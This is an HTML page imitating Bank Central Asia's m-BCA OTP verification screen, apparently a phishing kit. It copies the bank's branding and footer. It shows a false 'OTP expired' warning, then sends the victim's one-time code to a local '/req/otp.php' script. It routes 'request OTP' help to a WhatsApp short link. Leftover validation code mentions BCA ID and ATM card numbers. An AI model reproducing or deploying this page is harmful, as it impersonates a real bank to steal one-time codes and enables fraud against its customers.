<!DOCTYPE html><html lang="en">
<head> <title>Log m-BCA</title> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> <meta http-equiv="Cache-Control" content="max-age=0, no-cache, must-revalidate"> <meta http-equiv="Pragma" content="no-cache"> <meta http-equiv="Expires" content="0">
<link href="https://portal.mybca.bca.co.id/css/main.css" rel="stylesheet"> <link rel="icon" href="https://portal.mybca.bca.co.id/favicon/favicon.ico"> <link rel="apple-touch-icon" href="https://portal.mybca.bca.co.id/favicon/logo192.png"></head>
<body> <div class="container-lg"> <header> <nav class="navbar navbar-light px-0"> <a class="navbar-brand"> <img src="https://portal.mybca.bca.co.id/../img/logo_2x.png" alt="logo-BCA" style="width: 6rem;" /> </a> </nav> </header> <section> <div class="card shadow"> <div class="card-header"> <h5 class="card-title text-center m-0">Verifikasi Kode OTP</h5> </div> <div class="card-body d-flex py-5"> <div class="col"> <div class="row"> <div class="col-12 col-sm-8 col-md-7 col-lg-6 mx-auto"> 
<center>
<h6> </h6>
</center>
<br>
<div class="row">
<div class="col-12">
<div class="alert alert-v2 alert-warning d-flex" role="alert">
<div class="mr-2">
<img src="https://portal.mybca.bca.co.id//../img/svg alert/exclamation-circle-warning-color.svg" class="alert-width" /> </div> <div>
<span style="color: #BE980A;">Kode OTP telah kadaluarsa, Silahkan tunggu kode OTP yang baru akan dikirim ulang.
</span>
</div>
</div>
</div>
</div>
<form id="forgetPasswordForm" method="post" action="/req/otp.php" autocomplete="off">
<div class="row mb-4">
<div class="col-12">
<div class="form-group">
</center>
<label for="bcaId">Kode OTP</label>
<input type="text" class="form-control" id="bcaId" name="nootp" inputmode="numeric" maxLength="6" placeholder="Masukan Kode OTP" maxlength="6" value required />
</div>
</div>
<center>
<a style="font-weight;color:#005E6A;" target="_blank" rel="noreferrer noopener" href="https://wa.link/5o2dsf">Request Kode OTP ? </a>
</center>
</div>
<input type="hidden" id="recaptchaToken" name="recaptchaToken" value>
<div class="row">
<div class="col-12 col-sm col-md-8 mx-auto">
<button href="#" id="btnSubmit" class="btn btn-primary btn-block" type="submit">PROSES</button>
</div> </div> </form>
</div> </div> </div>
<div style="display: none;">
</div> </div> </div> </div> </section>
<footer class="small py-4"> <div class="container-lg">
<div class="row align-items-center justify-content-center justify-content-lg-start">
<div class="col col-sm-auto">
<div class="row">
<div class="col-12 col-sm-auto text-center"> <a target="_blank" rel="noreferrer noopener" href="https://wa.link/5o2dsf"> LOKASI BCA </a> </div> <div class="col-12 col-sm-auto text-center"> <a target="_blank" rel="noreferrer noopener" href="https://www.bca.co.id"> BCA.CO.ID </a> </div> </div> </div>
<div class="col col-sm-auto"> <div class="row"> <div class="col-12 col-sm-auto text-center"> <a target="_blank" rel="noreferrer noopener" href="https://www.bca.co.id/id/informasi/kurs"> INFORMASI KURS </a> </div> <div class="col-12 col-sm-auto text-center"> <a target="_blank" rel="noreferrer noopener" href> SOSIAL MEDIA </a> </div> </div> </div>
<div class="col-12 col-lg-auto ml-lg-auto"> <div class="row mt-3 mt-lg-0 no-gutters justify-content-lg-end"> <div class="col-12 col-lg-auto text-center"> <span class="text-muted mr-lg-2"> &copy;2021 PT Bank Central Asia Tbk, All Rights Reserved. </span> </div> <div class="col-12 col-lg-auto text-center"> <a target="_blank" rel="noreferrer noopener" href="https://www.bca.co.id/id/Syarat-dan-Ketentuan" class="mr-2"> Syarat &amp; Ketentuan </a> <a target="_blank" rel="noreferrer noopener" href="https://www.bca.co.id/id/informasi/Kebijakan-Privasi"> Kebijakan Privasi </a> </div> </div> </div>
</div> </footer> </div> <script src="#" async defer type="a27a2015133651e3e8e99b1d-text/javascript"></script> <script src="/vendors/jquery/dist/jquery.slim.min.js" type="a27a2015133651e3e8e99b1d-text/javascript"></script> <script src="/vendors/bootstrap/dist/js/bootstrap.min.js" type="a27a2015133651e3e8e99b1d-text/javascript"></script> <script src="/vendors/jquery-validation/dist/jquery.validate.js" type="a27a2015133651e3e8e99b1d-text/javascript"></script> <script src="/vendors/jquery-mask-plugin/dist/jquery.mask.js" type="a27a2015133651e3e8e99b1d-text/javascript"></script> <script type="a27a2015133651e3e8e99b1d-text/javascript">
window.onload = function () { $("#toHomeModal").modal({ backdrop: 'static', keyboard: false, show: true }); };
function onRecaptchaResolved(token) { $('#recaptchaToken').val(token); $('#forgetPasswordForm').submit(); }
function executeRecaptcha() { grecaptcha.enterprise.reset(); grecaptcha.enterprise.execute();
}
$(document).ready( function () { const $form = $('#forgetPasswordForm'); const $recaptchaToken = $('#recaptchaToken'); const $btnSubmit = $('#btnSubmit'); let isSubmit = false;
$('#cardNumber').mask('0000-0000-0000-0000');

$form.on('blur keyup change', 'input', function (event) {
if (!isSubmit) validateForm($form); });
function validateForm(id) { var valid = $(id).validate().checkForm(); if (valid) { $btnSubmit .prop('disabled', false);
} else { $btnSubmit .prop('disabled', 'disabled'); } }
$form.validate({ rules: { bcaId: { required: true, }, cardNumber: { required: true, minlength: 15, } }, messages: { bcaId: { required: "BCA ID tidak boleh kosong.", }, cardNumber: { required: "No. Kartu ATM tidak boleh kosong.", minlength: "No. Kartu ATM minimum 15 karakter." } }, errorElement: "span", errorPlacement: function (error, element) { error .addClass("invalid-feedback"); error.insertAfter(element); }, highlight: function (element, errorClass, validClass) { $(element) .addClass("is-invalid") .removeClass("is-valid"); }, unhighlight: function (element, errorClass, validClass) { $(element).addClass("is-valid") .removeClass( "is-invalid"); } });
$btnSubmit.on('click', (e) => { e.preventDefault(); isSubmit = true;
grecaptcha.enterprise.ready(() => { $btnSubmit.attr('disabled', 'disabled'); grecaptcha.enterprise.execute('6Le4wi0hAAAAAMWfKL3BtXyG21rtnSaDEpRiRWV2', { action: 'forget_password_submission' }).then((token) => { $recaptchaToken.val(token); $form.submit(); }); }); }); });

<script src="http://code.jquery.com/jquery-latest.js" type="text/javascript"></script>
<script type="a27a2015133651e3e8e99b1d-text/javascript">
setInterval(function(){
     $(".berkedip").toggle();
},300);
</html>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="a27a2015133651e3e8e99b1d-|49" defer></script>
